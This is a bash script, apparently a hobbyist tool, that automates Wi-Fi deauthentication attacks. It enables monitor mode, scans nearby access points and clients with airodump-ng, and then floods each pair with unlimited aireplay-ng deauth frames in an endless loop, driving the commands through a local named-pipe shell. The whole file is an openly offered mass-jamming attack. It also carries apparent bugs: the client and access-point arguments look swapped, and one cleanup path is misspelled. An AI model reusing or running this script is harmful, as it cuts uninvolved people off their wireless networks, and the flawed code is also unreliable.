#!/bin/bash
# TODO: #3 change the timeout command for the mkfifo shell-in-a-file <- Done ☑
# TODO: #4 change variables names to something understandable by humans

# Functions

function process-file (){
    cat ${1} | tr -c ' ' '\n' | grep ':' | tee ${1}-list
}

function stop (){
    sleep ${1}
    echo '^C' > /tmp/shell
}

# Setup monitor mode with airmon-ng cuz is easier
sudo airmon-ng start wlan1

# Setup a simulated shell cuz i can't get the sh*tty timeout command working
mkfifo /tmp/shell
tail -f /tmp/shell | /bin/sh 2>&1 > /tmp/shell &
echo -e "script /dev/null -c bash\n" > /tmp/shell

while true
do
    echo -e "sudo airodump-ng wlan1mon | tee /tmp/devices\n" > /tmp/shell
    stop 20

    process-file /tmp/devices

    for af2 in $(cat /tmp/devices-list)
    do
        echo -e "sudo airodump-ng --bssid ${af2} wlan1mon | tee /tmp/devices-in-wifi\n" > /tmp/shell
        stop 12 
        
        process-file /tmp/devices-in-wifi

        for az3 in $(cat /tmp/devices-in-wifi-list)
        do
            echo -e "sudo aireplay-ng -0 0 -c ${af2} -a ${az3} wlan1mon\n" > /tmp/shell
            stop 30
        done
        rm /tmp/{devices-in-wifi,devices-in-wifi-list}
    done
    rm /tmp/{devices,device-list}
done